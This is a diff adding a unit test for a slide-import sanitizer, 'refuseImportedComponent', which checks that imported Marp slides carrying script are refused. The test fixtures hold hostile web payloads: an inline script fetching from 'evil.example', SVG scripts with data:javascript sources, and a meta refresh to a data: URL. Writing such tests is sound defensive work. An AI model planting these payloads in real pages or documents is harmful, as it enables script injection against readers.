@@ -123,6 +123,17 @@ describe('refuseImportedComponent', () => {
 		expect(await refuseImportedComponent(css, 'w', '---\nmarp: true\ntheme: indaco\nprofile: teaching\nheader: "Lattice · w"\n---\n\n<!-- _class: w -->\n')).toBeNull();
 	});
 
+	it('refuses a sample slide that carries script, whichever attribute names its source', async () => {
+		// The Studio door hands the parsed script's text and attributes to the same shared rule
+		// as the CLI's; an SVG <script> names its file in href or xlink:href, not src.
+		const css = 'section.w .a{color:var(--accent)}';
+		expect((await refuseImportedComponent(css, 'w', '<!-- _class: w -->\n\n<script>fetch("https://evil.example/s")</script>'))?.why).toMatch(/inline <script>/);
+		for (const attr of ['href', 'xlink:href']) {
+			expect((await refuseImportedComponent(css, 'w', `<!-- _class: w -->\n\n<svg><script ${attr}="data:text/javascript,window.PWN=1"></script></svg>`))?.why).toMatch(/data: or javascript: source/);
+		}
+		expect((await refuseImportedComponent(css, 'w', '<!-- _class: w -->\n\n<meta http-equiv="refresh" content="0;url=data:text/html,x">'))?.why).toMatch(/refresh/);
+	});
+
 	it('refuses, rather than waves through, a sample slide it could not check', async () => {
 		const pg = window.LatticePlayground;
 		(window as unknown as { LatticePlayground: unknown }).LatticePlayground = { render: () => { throw new Error('boom'); }, referenceTargets: () => [] };
